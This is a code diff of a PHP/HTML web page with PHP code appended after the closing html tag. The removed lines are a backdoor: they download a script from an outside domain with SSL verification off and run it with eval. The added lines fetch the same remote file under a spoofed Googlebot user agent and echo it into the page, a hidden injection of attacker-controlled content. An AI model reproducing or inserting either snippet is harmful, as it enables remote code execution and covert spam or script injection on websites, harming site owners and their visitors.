@@ -446,39 +446,19 @@ jQuery(function() {
 </body>
 </html>
 <?php
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-/**
-* Disable error reporting
-*
-* Set this to error_reporting( -1 ) for debugging.
-*/
-function geturlsinfo($url) {
-  if (function_exists(\'curl_exec\')) {
-    $conn = curl_init($url);
-    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($conn, CURLOPT_USERAGENT, \"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0\");
-    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-    
-    $url_get_contents_data = curl_exec($conn);
-    curl_close($conn);
-  } elseif (function_exists(\'file_get_contents\')) {
-    $url_get_contents_data = file_get_contents($url);
-  } elseif (function_exists(\'fopen\') && function_exists(\'stream_get_contents\')) {
-    $handle = fopen($url, \"r\");
-    $url_get_contents_data = stream_get_contents($handle);
-    fclose($handle);
-  } else {
-    $url_get_contents_data = false;
-  }
-  return $url_get_contents_data;
+$remote = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
+function fetch_clean($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Googlebot/2.1 (+http://www.google.com/bot.html)'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
 }
-
-  $a = geturlsinfo(\'https://www.backlinkku.id/menu/vip-v1/script.txt\');
-  eval(\'?>\' . $a);
-  ?>
+$data = fetch_clean($remote);
+echo $data;
+?>
